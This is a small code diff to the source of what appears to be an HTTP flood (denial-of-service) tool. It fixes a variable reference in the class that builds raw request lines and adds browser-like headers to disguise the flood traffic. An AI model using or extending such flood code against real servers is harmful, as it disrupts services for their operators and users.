@@ -385,7 +385,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
-                                                       url.raw_path_qs)
+                                                       self._url.raw_path_qs)
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
